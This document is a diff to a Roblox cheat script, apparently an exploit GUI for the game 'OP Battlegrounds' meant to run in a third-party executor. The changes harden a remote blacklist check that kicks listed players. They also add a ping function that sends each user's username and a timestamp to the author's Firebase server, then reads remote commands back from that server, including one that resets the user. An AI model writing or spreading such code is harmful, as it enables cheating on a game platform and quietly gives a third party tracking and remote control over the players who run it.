@@ -1,6 +1,4 @@
--- Realirist's OPBGGUI
--- Update 22/6/2025 DD/MM/YY
--- Added blacklist and more info to the log
+-- opbggui superuser update, added pinging
 
 -- Instances:
 
@@ -1075,7 +1073,7 @@ UISizeConstraint_46.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function AIZKD_fake_script() -- Main.LocalScript 
+local function VQOKF_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
@@ -1092,16 +1090,21 @@ local function AIZKD_fake_script() -- Main.LocalScript
 	end
 	print(http_request({Url = "https://example.com", Method = "GET"}))
 	local queue_on_teleport = queue_on_teleport or function() end
-	local isBlacklisted = (
-		game:GetService("HttpService"):JSONDecode(
-			http_request(
-				{
-					Url = string.format("https://opbgguiserver-default-rtdb.firebaseio.com/blacklist/%s.json", game.Players.LocalPlayer.Name or ""),
-					Method = "GET"
-				}
-			)["Body"]
-		))~=nil
-	if isBlacklisted then
+	local function isBlacklisted()
+		local s,d = pcall(function()
+			return (
+				game:GetService("HttpService"):JSONDecode(
+					http_request(
+						{
+							Url = string.format("https://opbgguiserver-default-rtdb.firebaseio.com/blacklist/%s.json", game.Players.LocalPlayer.Name or ""),
+							Method = "GET"
+						}
+					)["Body"]
+				))~=nil
+		end)
+		if s and d then return true else return false end
+	end
+	if isBlacklisted() then
 		warn("BLACKLISTED")
 		game:GetService("Players").LocalPlayer:Kick("Blacklisted")
 		task.wait()
@@ -2181,7 +2184,17 @@ local function AIZKD_fake_script() -- Main.LocalScript
 						end
 						return nil
 					end
-	
+					local function ping()
+						local response = http_request({
+							Url = `https://opbgguiserver-default-rtdb.firebaseio.com/main/{game.Players.LocalPlayer.Name}.json`,
+							Method = "PATCH",
+							Body = game:GetService("HttpService"):JSONEncode({
+								ping = DateTime.now().UnixTimestamp
+							}),
+							Headers = {["Content-Type"] = "application/json"}
+						})
+					end
+					ping()
 					local command = getSelfData()['command']
 					if command then
 						local function resetUser()
@@ -2300,4 +2313,4 @@ local function AIZKD_fake_script() -- Main.LocalScript
 	d.MinSize = d.MaxSize
 	d.Parent = a
 end
-coroutine.wrap(AIZKD_fake_script)()
+coroutine.wrap(VQOKF_fake_script)()
